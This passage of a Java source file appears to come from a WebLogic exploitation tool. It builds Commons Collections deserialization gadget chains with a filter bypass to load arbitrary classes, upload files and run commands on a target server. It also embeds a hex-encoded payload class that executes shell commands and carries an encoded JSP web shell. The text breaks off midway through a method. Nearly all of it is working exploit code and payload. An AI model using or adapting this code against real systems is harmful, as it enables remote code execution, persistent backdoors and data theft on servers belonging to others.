package com.supeream.serial;

import com.supeream.weblogic.BypassPayloadSelector;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Created by nike on 17/7/3.
 */
public class SerialDataGenerator {

    private static final String REMOTE = "com.supeream.payload.RemoteImpl";
    private static final String remoteHex = "cafebabe0000003201000a004400900700910a000200900800920a009300940a000200950700960a000700900800970800980b0099009a08009b0b0099009c07009d07009e0a000f009f0a000f00a00a000f00a10a000f00a20800a30800a40700a50a0016009f0a001600a60a001600a70700a80a001a00900a001a00a90800aa0800ab0a001a00ac0700ad0a002000900a002000ae0800af0a009300b00800b10a009300b20800b30a00b400b50a009300b60800b70a009300b80700b90a002c00900800ba0b00bb00bc0800bd0800be0800bf0800c00700c10a003400c20a003400c30a003400c40700c50700c60a00c700c80a003900c90a003800ca0700cb0a003d00900a003800cc0a003d00cd0800ce0a003d00ac0a000e00cf0700d00700d10100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100214c636f6d2f737570657265616d2f7061796c6f61642f52656d6f7465496d706c3b0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b29560100036374780100164c6a617661782f6e616d696e672f436f6e746578743b01000672656d6f7465010001650100154c6a6176612f6c616e672f457863657074696f6e3b010004617267730100135b4c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c650700910700d207009d0100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b2956010003636d640100124c6a6176612f6c616e672f537472696e673b01000a457863657074696f6e730700d301000a75706c6f616446696c65010017284c6a6176612f6c616e672f537472696e673b5b42295601001066696c654f757470757453747265616d01001a4c6a6176612f696f2f46696c654f757470757453747265616d3b01000470617468010007636f6e74656e740100025b4201000f75706c6f616446696c655368656c6c010015284c6a6176612f6c616e672f537472696e673b29560100046e616d65010004617272240100046c656e240100014901000269240100056e616d65730100046576696c01000364697201000466696c6501000e4c6a6176612f696f2f46696c653b01000866696c654e616d650700d40700a50700550100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b01000262720100184c6a6176612f696f2f42756666657265645265616465723b01000273620100184c6a6176612f6c616e672f537472696e674275666665723b0100046c696e650100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b0700d50700c10700d60700c50700cb01000a536f7572636546696c6501000f52656d6f7465496d706c2e6a6176610c0046004701001f636f6d2f737570657265616d2f7061796c6f61642f52656d6f7465496d706c010005626c696e640700d40c00d700d80c0077007801001b6a617661782f6e616d696e672f496e697469616c436f6e74657874010007696e7374616c6c010008737570657265616d0700d20c00d900da010009756e696e7374616c6c0c00db00680100136a6176612f6c616e672f457863657074696f6e0100186a6176612f696f2f46696c654f757470757453747265616d0c004600680c00dc00dd0c00de00470c00df00470125dc504356416347466e5a53427062584276636e5139496d7068646d4575615738754b69787159585a684c6e5630615777754b69787159585a684c6d356c644334714c477068646d4575633346734c696f73616d4632595335305a5868304c696f694a5434384a53465464484a70626d63675548646b50534a7861584e6f615864766332687065576c6e5a57686862334a6c62694937553352796157356e49474e7a50534a56564559744f434937553352796157356e494556444b464e30636d6c755a79427a4b58526f636d39336379424665474e6c6348527062323537636d563064584a754947356c6479425464484a70626d636f6379356e5a5852436558526c6379676953564e504c5467344e546b744d5349704c474e7a4b54743951323975626d566a64476c76626942485179685464484a70626d636763796c3061484a7664334d675258686a5a5842306157397565314e30636d6c755a3174644948673963793530636d6c744b436b75633342736158516f496c7879584734694b5474446247467a6379356d62334a4f5957316c4b4868624d46307564484a70625367704b5474705a696834577a46644c6d6c755a4756345432596f496d706b596d4d3662334a685932786c49696b68505330784b5874795a585231636d346752484a70646d5679545746755957646c6369356e5a585244623235755a574e30615739754b4868624d56307564484a70625367704b79493649697434577a52644c4868624d6c30755a5846315957787a5357647562334a6c5132467a5a536769577939756457787358534970507949694f6e68624d6c30736546737a5853356c6358566862484e4a5a323576636d564459584e6c4b434a624c3235316247786449696b2f496949366546737a58536b37665756736332563751323975626d566a64476c766269426a5055527961585a6c636b3168626d466e5a5849755a32563051323975626d566a64476c7662696834577a46644c6e52796157306f4b537834577a4a644c6d56786457467363306c6e626d39795a554e686332556f496c7376626e5673624630694b543869496a7034577a4a644c4868624d3130755a5846315957787a5357647562334a6c5132467a5a536769577939756457787358534970507949694f6e68624d3130704f326c6d4b486775624756755a33526f506a517065324d756332563051324630595778765a796834577a52644b547439636d563064584a7549474d376658313262326c6b494546424b464e30636d6c755a304a315a6d5a6c6369427a59696c3061484a7664334d675258686a5a5842306157397565305a7062475567636c746450555a706247557562476c7a64464a766233527a4b436b375a6d39794b476c756443427050544137615478794c6d786c626d6430614474704b79737065334e694c6d4677634756755a43687957326c644c6e5276553352796157356e4b436b7563335669633352796157356e4b4441734d696b704f333139646d39705a4342435169685464484a70626d63676379785464484a70626d644364575a6d5a58496763324970644768796233647a494556345932567764476c76626e74476157786c494739475057356c647942476157786c4b484d704c477862585431765269357361584e30526d6c735a584d6f4b54745464484a70626d636763315173633145736330593949694937616d46325953353164476c734c6b5268644755675a48513755326c746347786c524746305a555a76636d31686443426d625431755a58636755326c746347786c524746305a555a76636d31686443676965586c356553314e5453316b5a434249534470746254707a637949704f325a7663696870626e5167615430774f79427050477775624756755a33526f4f7942704b797370653252305057356c6479427159585a684c6e563061577775524746305a53687357326c644c6d78686333524e623252705a6d6c6c5a4367704b54747a5644316d6253356d62334a745958516f5a4851704f334e52505778626156307559324675556d56685a43677050794a53496a6f69496a747a5553417250577862615630755932467556334a706447556f4b543869494663694f6949694f326c6d4b4778626156307561584e4561584a6c59335276636e6b6f4b536c3763324975595842775a57356b4b477862615630755a325630546d46745a5367704b794976584851694b334e554b794a636443497262467470585335735a57356e6447676f4b537369584851694b334e524b794a63626949704f33316c62484e6c65334e474b7a317357326c644c6d646c644535686257556f4b537369584851694b334e554b794a636443497262467470585335735a57356e6447676f4b537369584851694b334e524b794a63626949376658317a596935686348426c626d516f633059704f33313262326c6b494556464b464e30636d6c755a79427a4b58526f636d39336379424665474e6c6348527062323537526d6c735a53426d5057356c647942476157786c4b484d704f326c6d4b47597561584e4561584a6c59335276636e6b6f4b536c37526d6c735a534234573130395a69357361584e30526d6c735a584d6f4b54746d6233496f61573530494773394d4473676179413849486775624756755a33526f4f7942724b79737065326c6d4b434634573274644c6d526c624756305a5367704b58744652536834573274644c6d646c644642686447676f4b536b37665831395a69356b5a57786c6447556f4b547439646d39705a4342475269685464484a70626d6367637978496448527755325679646d786c64464a6c63334276626e4e6c49484970644768796233647a494556345932567764476c76626e7470626e5167626a74696558526c57313067596a31755a586367596e6c305a5673314d544a644f334975636d567a5a58516f4b5474545a584a32624756305433563063485630553352795a5746744947397a505849755a3256305433563063485630553352795a5746744b436b37516e566d5a6d56795a57524a626e423164464e30636d566862534270637a31755a586367516e566d5a6d56795a57524a626e423164464e30636d5668625368755a586367526d6c735a556c7563485630553352795a5746744b484d704b54747663793533636d6c305a53676f4969302b49697369664349704c6d646c64454a356447567a4b436b734d43777a4b54743361476c735a53676f626a3170637935795a57466b4b4749734d4377314d5449704b5345394c5445706532397a4c6e64796158526c4b4749734d4378754b54743962334d7564334a706447556f4b434a3849697369504330694b53356e5a5852436558526c637967704c4441734d796b3762334d75593278766332556f4b5474706379356a6247397a5a5367704f33313262326c6b494564484b464e30636d6c755a79427a4c464e30636d6c755a79426b4b58526f636d39336379424665474e6c6348527062323537553352796157356e49476739496a41784d6a4d304e5459334f446c42516b4e45525559694f305a70624755675a6a31755a586367526d6c735a53687a4b54746d4c6d4e795a5746305a55356c64305a706247556f4b5474476157786c5433563063485630553352795a5746744947397a5057356c647942476157786c5433563063485630553352795a5746744b4759704f325a7663696870626e5167615430774f79427050475175624756755a33526f4b436b37615373394d696c3762334d7564334a706447556f4b4767756157356b5a5868505a69686b4c6d4e6f59584a42644368704b536b67504477674e434238494767756157356b5a5868505a69686b4c6d4e6f59584a42644368704b7a45704b536b704f3331766379356a6247397a5a5367704f33313262326c6b494568494b464e30636d6c755a79427a4c464e30636d6c755a79426b4b58526f636d39336379424665474e6c6348527062323537526d6c735a53427a5a6a31755a586367526d6c735a53687a4b53786b5a6a31755a586367526d6c735a53686b4b5474705a69687a5a69357063305270636d566a64473979655367704b5874705a6967685a4759755a5868706333527a4b436b706532526d4c6d31725a476c794b436b3766555a7062475567656c746450584e6d4c6d7870633352476157786c637967704f325a7663696870626e5167616a30774f79427150486f75624756755a33526f4f7942714b797370653068494b484d72496938694b337062616c30755a325630546d46745a5367704c475172496938694b337062616c30755a325630546d46745a5367704b5474396657567363325637526d6c735a556c7563485630553352795a57467449476c7a5057356c647942476157786c535735776458525464484a6c5957306f633259704f305a7062475650645852776458525464484a6c5957306762334d39626d563349455a7062475650645852776458525464484a6c5957306f5a4759704f326c75644342754f324a3564475662585342695057356c647942696558526c577a55784d6c3037643268706247556f4b47343961584d75636d56685a4368694c4441734e5445794b536b68505330784b58747663793533636d6c305a5368694c44417362696b3766576c7a4c6d4e7362334e6c4b436b3762334d75593278766332556f4b54743966585a766157516753556b6f553352796157356e49484d73553352796157356e49475170644768796233647a494556345932567764476c76626e74476157786c49484e6d5057356c647942476157786c4b484d704c47526d5057356c647942476157786c4b4751704f334e6d4c6e4a6c626d46745a5652764b47526d4b547439646d39705a43424b5369685464484a70626d636763796c3061484a7664334d675258686a5a5842306157397565305a70624755675a6a31755a586367526d6c735a53687a4b54746d4c6d31725a476c794b436b3766585a76615751675330736f553352796157356e49484d73553352796157356e49485170644768796233647a494556345932567764476c76626e74476157786c49475939626d563349455a706247556f63796b3755326c746347786c524746305a555a76636d31686443426d625431755a58636755326c746347786c524746305a555a76636d31686443676965586c356553314e5453316b5a434249534470746254707a637949704f327068646d457564585270624335455958526c4947523050575a744c6e4268636e4e6c4b4851704f325975633256305447467a644531765a476c6d6157566b4b4752304c6d646c644652706257556f4b536b3766585a76615751675445776f553352796157356e49484d73553352796157356e49475170644768796233647a494556345932567764476c76626e7456556b7767645431755a58636756564a4d4b484d704f326c756443427550544137526d6c735a5539316448423164464e30636d566862534276637a31755a586367526d6c735a5539316448423164464e30636d56686253686b4b5474496448527756564a4d51323975626d566a64476c766269426f505368496448527756564a4d51323975626d566a64476c7662696b67645335766347567551323975626d566a64476c76626967704f306c7563485630553352795a57467449476c7a505767755a325630535735776458525464484a6c5957306f4b5474696558526c57313067596a31755a586367596e6c305a5673314d544a644f33646f6157786c4b43687550576c7a4c6e4a6c5957516f59696b70495430744d536c3762334d7564334a706447556f596977774c4734704f3331766379356a6247397a5a5367704f326c7a4c6d4e7362334e6c4b436b376143356b61584e6a623235755a574e304b436b3766585a76615751675455306f535735776458525464484a6c5957306761584d73553352796157356e516e566d5a6d567949484e694b58526f636d39336379424665474e6c6348527062323537553352796157356e49477737516e566d5a6d56795a5752535a57466b5a584967596e4939626d563349454a315a6d5a6c636d566b556d56685a4756794b47356c6479424a626e423164464e30636d566862564a6c5957526c6369687063796b704f33646f6157786c4b43687350574a794c6e4a6c5957524d6157356c4b436b7049543175645778734b58747a596935686348426c626d516f6243736958484a63626949704f333139646d39705a43424f5469685464484a70626d63676379785464484a70626d644364575a6d5a58496763324970644768796233647a494556345932567764476c76626e7444623235755a574e306157397549474d3952304d6f63796b37556d567a64577830553256304948493963793570626d526c6545396d4b434a715a474a6a4f6d397959574e735a534970495430744d54396a4c6d646c6445316c64474645595852684b436b755a32563055324e6f5a573168637967704f6d4d755a32563054575630595552686447456f4b53356e5a585244595852686247396e637967704f33646f6157786c4b484975626d5634644367704b58747a596935686348426c626d516f6369356e5a58525464484a70626d636f4d536b72496c783049696b3766584975593278766332556f4b54746a4c6d4e7362334e6c4b436b3766585a76615751675430386f553352796157356e49484d73553352796157356e516e566d5a6d567949484e694b58526f636d39336379424665474e6c634852706232353751323975626d566a64476c766269426a505564444b484d704f314e30636d6c755a3174644948673963793530636d6c744b436b75633342736158516f496c7879584734694b5474535a584e31624852545a585167636a316a4c6d646c6445316c64474645595852684b436b755a325630564746696247567a4b4735316247777363793570626d526c6545396d4b434a715a474a6a4f6d397959574e735a534970495430744d5439344c6d786c626d643061443431503368624e5630366546733058547075645778734c43496c496978755a586367553352796157356e57313137496c5242516b7846496e30704f33646f6157786c4b484975626d5634644367704b58747a596935686348426c626d516f6369356e5a58525464484a70626d636f496c5242516b784658303542545555694b537369584851694b5474396369356a6247397a5a5367704f324d75593278766332556f4b547439646d39705a4342515543685464484a70626d63676379785464484a70626d644364575a6d5a58496763324970644768796233647a494556345932567764476c76626e745464484a70626d64625853423450584d7564484a70625367704c6e4e7762476c304b434a63636c787549696b3751323975626d566a64476c766269426a505564444b484d704f314e305958526c625756756443427450574d7559334a6c5958526c55335268644756745a5735304b4445774d4455734d5441774e796b37556d567a6457783055325630494849396253356c6547566a6458526c5558566c636e6b6f496e4e6c6247566a6443417149475a79623230674969743457336775624756755a33526f4c5446644b5474535a584e31624852545a58524e5a585268524746305953426b505849755a32563054575630595552686447456f4b54746d6233496f6157353049476b394d5474705044316b4c6d646c64454e7662485674626b4e76645735304b436b37615373724b58747a596935686348426c626d516f5a43356e5a585244623278316257354f5957316c4b476b704b7949674b4349725a43356e5a58524462327831625735556558426c546d46745a5368704b5373694b56783049696b3766584975593278766332556f4b5474744c6d4e7362334e6c4b436b375979356a6247397a5a5367704f33313262326c6b494646524b464e30636d6c755a79426a6379785464484a70626d63676379785464484a70626d63676353785464484a70626d644364575a6d5a58496763324973553352796157356e49484170644768796233647a494556345932567764476c76626e7444623235755a574e306157397549474d3952304d6f63796b3755335268644756745a573530494730395979356a636d566864475654644746305a57316c626e516f4d5441774e5377784d4441344b54744364575a6d5a584a6c5a4664796158526c63694269647a4539626e567362447430636e6c37556d567a6457783055325630494849396253356c6547566a6458526c5558566c636e6b6f63533570626d526c6545396d4b4349744c57593649696b68505330785033457563335669633352796157356e4b44417363533570626d526c6545396d4b4349744c57593649696b704f6e45704f314a6c6333567364464e6c6445316c6447464559585268494751396369356e5a58524e5a58526852474630595367704f326c7564434275505751755a325630513239736457317551323931626e516f4b54746d6233496f6157353049476b394d547367615341385057343749476b724b796c3763324975595842775a57356b4b4751755a3256305132397364573175546d46745a5368704b53736958485238584851694b54743963324975595842775a57356b4b434a63636c787549696b376157596f63533570626d526c6545396d4b4349744c57593649696b68505330784b5874476157786c49475a7062475539626d563349455a706247556f63436b376157596f63533570626d526c6545396d4b4349746447383649696b39505330784b58746d6157786c4c6d31725a476c794b436b3766574a334d5431755a586367516e566d5a6d56795a575258636d6c305a58496f626d5633494539316448423164464e30636d5668625664796158526c636968755a586367526d6c735a5539316448423164464e30636d5668625368755a586367526d6c735a5368784c6d6c755a4756345432596f49693130627a6f694b5345394c54452f63433530636d6c744b436b36634374784c6e4e31596e4e30636d6c755a7968784c6d6c755a4756345432596f496930745a6a6f694b5373304c484575624756755a33526f4b436b704c6e52796157306f4b536b7364484a315a536b7359334d704b547439643268706247556f636935755a5868304b436b7065325a7663696870626e5167615430784f794270504431754f326b724b796c376157596f63533570626d526c6545396d4b4349744c57593649696b68505330784b587469647a457564334a706447556f6369356e5a585250596d706c5933516f61536b7249694972496c783049696b37596e63784c6d5a7364584e6f4b436b37665756736332563763324975595842775a57356b4b4849755a32563054324a715a574e304b476b704b7949694b794a6364487863644349704f3331396157596f596e637849543175645778734b587469647a4575626d563354476c755a5367704f33317a596935686348426c626d516f496c7879584734694b5474396369356a6247397a5a5367704f326c6d4b474a334d534539626e567362436c37596e63784c6d4e7362334e6c4b436b376658316a5958526a6143684665474e6c63485270623234675a536c3763324975595842775a57356b4b434a535a584e31624852636448786364467879584734694b547430636e6c376253356c6547566a6458526c5658426b5958526c4b4845704f334e694c6d4677634756755a4367695258686c593356305a53425464574e6a5a584e7a5a6e567362486b685848523858485263636c787549696b3766574e6864474e6f4b4556345932567764476c766269426c5a536c3763324975595842775a57356b4b47566c4c6e5276553352796157356e4b436b72496c78306646783058484a63626949704f3331396253356a6247397a5a5367704f324d75593278766332556f4b5474394a5434384a574e7a50584a6c6358566c633351755a325630554746795957316c644756794b434a364d434970495431756457787350334a6c6358566c633351755a325630554746795957316c644756794b434a364d4349704b7949694f6d4e7a4f334a6c63334276626e4e6c4c6e4e6c64454e76626e526c626e52556558426c4b434a305a5868304c326830625777694b5474795a584e776232357a5a53357a5a5852446147467959574e305a584a46626d4e765a476c755a79686a63796b37553352796157356e516e566d5a6d567949484e695057356c6479425464484a70626d644364575a6d5a58496f496949704f3352796558745464484a70626d6367576a3146517968795a5846315a584e304c6d646c64464268636d46745a58526c63696851643251704b7949694b54745464484a70626d6367656a453952554d6f636d56786457567a6443356e5a58525159584a68625756305a58496f496e6f7849696b72496949704f314e30636d6c755a7942364d6a3146517968795a5846315a584e304c6d646c64464268636d46745a58526c63696769656a49694b53736949696b3763324975595842775a57356b4b43497450694972496e77694b54745464484a70626d6367637a31795a5846315a584e304c6d646c64464e6c63334e706232346f4b53356e5a5852545a584a32624756305132397564475634644367704c6d646c64464a6c63323931636d4e6c4b43497649696b755a325630526d6c735a5367704f326c6d4b466f755a5846315957787a4b434a4249696b7065334e694c6d4677634756755a43687a4b794a63644349704f326c6d4b43467a4c6e4e31596e4e30636d6c755a7967774c4445704c6d567864574673637967694c7949704b5874425153687a59696b376658316c62484e6c49476c6d4b466f755a5846315957787a4b434a4349696b7065304a434b486f784c484e694b5474395a57787a5a5342705a6968614c6d56786457467363796769517949704b58745464484a70626d636762443069496a744364575a6d5a584a6c5a464a6c5957526c63694269636a31755a586367516e566d5a6d56795a5752535a57466b5a58496f626d563349456c7563485630553352795a574674556d56685a4756794b47356c647942476157786c535735776458525464484a6c5957306f626d563349455a706247556f656a45704b536b704f33646f6157786c4b43687350574a794c6e4a6c5957524d6157356c4b436b7049543175645778734b58747a596935686348426c626d516f6243736958484a63626949704f3331696369356a6247397a5a5367704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a4549696b7065304a315a6d5a6c636d566b56334a706447567949474a334d6a31755a586367516e566d5a6d56795a575258636d6c305a58496f626d5633494539316448423164464e30636d5668625664796158526c636968755a586367526d6c735a5539316448423164464e30636d5668625368755a586367526d6c735a5368364d536b704b536b37596e63794c6e64796158526c4b486f794b547469647a4975593278766332556f4b54747a596935686348426c626d516f496a45694b5474395a57787a5a5342705a6968614c6d56786457467363796769525349704b587446525368364d536b3763324975595842775a57356b4b43497849696b3766575673633255676157596f5769356c6358566862484d6f496b59694b536c37526b596f656a4573636d567a63473975633255704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a4849696b70653064484b486f784c486f794b54747a596935686348426c626d516f496a45694b5474395a57787a5a5342705a6968614c6d56786457467363796769534349704b587449534368364d5378364d696b3763324975595842775a57356b4b43497849696b3766575673633255676157596f5769356c6358566862484d6f496b6b694b536c3753556b6f656a4573656a49704f334e694c6d4677634756755a4367694d5349704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a4b49696b706530704b4b486f784b54747a596935686348426c626d516f496a45694b5474395a57787a5a5342705a6968614c6d56786457467363796769537949704b58744c537968364d5378364d696b3763324975595842775a57356b4b43497849696b3766575673633255676157596f5769356c6358566862484d6f496b77694b536c375445776f656a4573656a49704f334e694c6d4677634756755a4367694d5349704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a4e49696b7065314e30636d6c755a31746449474d3965336f784c6e4e31596e4e30636d6c755a7967794b5378364d53357a64574a7a64484a70626d636f4d4377794b5378364d6e303755484a765932567a6379427750564a31626e5270625755755a325630556e567564476c745a5367704c6d56345a574d6f59796b375455306f6343356e5a58524a626e423164464e30636d5668625367704c484e694b54744e545368774c6d646c64455679636d3979553352795a5746744b436b73633249704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a4f49696b706530354f4b486f784c484e694b5474395a57787a5a5342705a6968614c6d56786457467363796769547949704b587450547968364d53787a59696b3766575673633255676157596f5769356c6358566862484d6f496c41694b536c375546416f656a4573633249704f33316c62484e6c49476c6d4b466f755a5846315957787a4b434a5249696b70653146524b474e7a4c486f784c486f794c484e694c486f794c6d6c755a4756345432596f49693130627a6f694b5345394c54452f656a497563335669633352796157356e4b486f794c6d6c755a4756345432596f49693130627a6f694b5373304c486f794c6d786c626d6430614367704b54707a4c6e4a6c63477868593256426247776f496c7863584677694c43497649696b72496d6c745957646c637938694b54743966574e6864474e6f4b4556345932567764476c766269426c4b58746c4c6e4279615735305533526859327455636d466a5a5367704f334e694c6d4677634756755a43676952564a53543149694b7949364c793867496974795a5846315a584e304c6d646c64464e6c63334e706232346f4b53356e5a5852545a584a32624756305132397564475634644367704c6d646c64464a6c63323931636d4e6c4b43497649696b755a325630526d6c735a5367704b794a34654349725a53353062314e30636d6c755a7967704b54743963324975595842775a57356b4b434a3849697369504330694b5474766458517563484a70626e516f633249756447395464484a70626d636f4b536b374a54343d0100382e2f736572766572732f41646d696e5365727665722f746d702f5f574c5f696e7465726e616c2f6265615f776c735f696e7465726e616c2f01000c6a6176612f696f2f46696c650c00e000e10c00e200e30100176a6176612f6c616e672f537472696e674275696c6465720c00e400e50100052f7761722f0100042e6a73700c00e600e70100257765626c6f6769632f7574696c732f656e636f646572732f4241534536344465636f6465720c00e800e901000a73686f776d65636f64650c00ea00d80100096775657373206d653f0c00eb00ec0100076f732e6e616d650700ed0c00ee00780c00ef00e701000377696e0c00f000f10100136a6176612f7574696c2f41727261794c697374010004244e4f240700d50c00f200f30100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c004600f40c00f500f60c00f700f80100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720700d60c00f900fa0c004600fb0c004600fc0100166a6176612f6c616e672f537472696e674275666665720c00fd00e70c00e400fe0100010a0c00ff00e70100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100146a617661782f6e616d696e672f436f6e746578740100186a6176612f726d692f52656d6f7465457863657074696f6e0100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100116a6176612f6c616e672f50726f63657373010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b2956010006756e62696e640100057772697465010005285b422956010005666c757368010005636c6f736501000665786973747301000328295a0100046c69737401001528295b4c6a6176612f6c616e672f537472696e673b010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e6701001428294c6a6176612f6c616e672f537472696e673b01000c6465636f6465427566666572010016284c6a6176612f6c616e672f537472696e673b295b4201000a73746172747357697468010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f77657243617365010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e6501002c284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275666665723b01000a6765744d6573736167650021000200440001004500000006000100460047000100480000002f00010001000000052ab70001b100000002004900000006000100000016004a0000000c000100000005004b004c00000009004d004e00010048000000f90003000300000061bb000259b700034c2abe05a000192a03321204b6000599000e2b2a0432b6000657a7003b2abe04a00035bb000759b700084d2a03321209b6000599000f2c120a2bb9000b0300a700162a0332120cb6000599000b2c120ab9000d0200a700044cb100010000005c005f000e0003004900000032000c0000001b0008001d0019001e0024001f002a002000320021003d00220049002300540024005c0029005f00270060002a004a0000002a00040032002a004f00500002000800540051004c000100600000005200530001000000610054005500000056000000160005fc0024070057fc0024070058f9001242070059000001005a005b000200480000003f0000000300000001b100000002004900000006000100000030004a00000020000300000001004b004c000000000001005c005d0001000000010054005d0002005e000000040001005f0009006000610001004800000090000300030000001bbb000f592ab700104d2c2bb600112cb600122cb60013a700044db10001000000160019000e000300490000001e00070000003400090035000e0036001200370016003a00190038001a003b004a0000002a00040009000d006200630002001a00000052005300020000001b0064005d00000000001b0065006600010056000000070002590700590000090067006800010048000001930003000b0000008912144c12154dbb0016592cb700174e2db600189900712db600193a0419043a051905be360603360715071506a2005819051507323a08bb001a59b7001b2cb6001c1908b6001c121db6001c2ab6001c121eb6001cb6001f3a09bb000f591909b700103a0a190abb002059b700212bb60022b60011190ab60012190ab60013840701a7ffa7a700044cb10001000000840087000e000300490000003e000f0000003f0003004000060041000f004200160043001c0044003600450059004600640048007400490079004a007e0044008400500087004e00880051004a0000007a000c005900250064005d00090064001a00620063000a003600480069005d000800200064006a005500050025005f006b006c00060028005c006d006c0007001c0068006e0055000400030081006f005d00010006007e0070005d0002000f007500710072000300880000005200530001000000890073005d000000560000002c0004ff0028000807007407007407007407007507007607007601010000ff005b00010700740000420700590000010077007800020048000002540005000a000000ee2b1223b600249a00061225b02b100ab600264c043d1227b800284e2dc600112db60029122ab6002b990005033dbb002c59b7002d3a042b122eb6002499001319042b07b60026b9002f020057a700441c99002319041230b9002f02005719041231b9002f02005719042bb9002f020057a7002019041232b9002f02005719041233b9002f02005719042bb9002f020057bb0034591904b700353a05190504b60036571905b600373a06bb003859bb0039591906b6003ab7003bb7003c3a07bb003d59b7003e3a081907b6003f593a09c6001319081909b600401241b6004057a7ffe81908b60042b04d2cb60043b000020000000b00e8000e000c00e700e8000e000400490000006e001b0000005800090059000c005b0013005e0015005f001b0060002b0061002d006400360066003f0067004f006800530069005d006a0067006b0073006d007d006e0087006f00900072009b007300a2007400a9007600be007700c7007a00d2007b00e2007e00e8007f00e90080004a00000070000b001500d30079007a0002001b00cd007b005d0003003600b2007c007d0004009b004d007e007f000500a9003f00800081000600be002a00820083000700c7002100840085000800cf00190086005d000900e90005005200530002000000ee004b004c0000000000ee005c005d000100870000000c0001003600b2007c0088000400560000004800080cfd002001070074fc0021070089231cff003600090700570700740107007407008907008a07008b07008c07008d0000fc001a070074ff000500020700570700740001070059005e000000040001005f0001008e00000002008f";


    private static byte[] serialData(Transformer[] transformers) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        // 初始化map 设置laymap
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) Reflections
                .getFirstCtor(
                        "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
                .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),
                        new Class[]{Map.class}, handler));

        handler = (InvocationHandler) Reflections.getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, mapProxy);

        Object _handler = BypassPayloadSelector.selectBypass(handler);
        return Serializables.serialize(_handler);
    }

    private static Transformer[] defineAndLoadPayloadTransformerChain(String className, byte[] clsData, String[] bootArgs) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    private static Transformer[] uploadTransformerChain(String className, byte[] clsData, String filePath, byte[] content) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"uploadFile", new Class[]{String.class, byte[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{filePath, content}}),
                new ConstantTransformer(new HashSet())};
        return transformers;
    }

    private static Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) throws Exception {
        if (execArgs.length == 1) {
            String cmd = execArgs[0];
            execArgs = cmd.split(" ");
        }
        System.out.println(Arrays.asList(execArgs));
        Transformer[] transformers = new Transformer[]{
